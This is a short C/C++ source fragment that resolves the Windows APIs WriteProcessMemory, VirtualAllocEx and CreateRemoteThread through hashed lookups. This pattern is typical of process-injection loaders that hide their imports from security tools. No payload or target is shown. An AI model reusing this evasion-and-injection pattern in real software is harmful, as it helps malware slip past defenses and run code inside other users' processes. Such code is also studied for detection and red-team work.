    pWriteProcessMemory _WriteProcessMemory = (pWriteProcessMemory)GetProcAddressByHash(GetModuleHandleA("kernel32.dll"), 0x5998f285); // WriteProcessMemory
    pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)GetProcAddressByHash(GetModuleHandleA("kernel32.dll"), 0x91eaf65a); // VirtualAllocEx
    pCreateRemoteThread _CreateRemoteThread = (pCreateRemoteThread)GetProcAddressByHash(GetModuleHandleA("kernel32.dll"), 0x6c11e9b1); // CreateRemoteThread
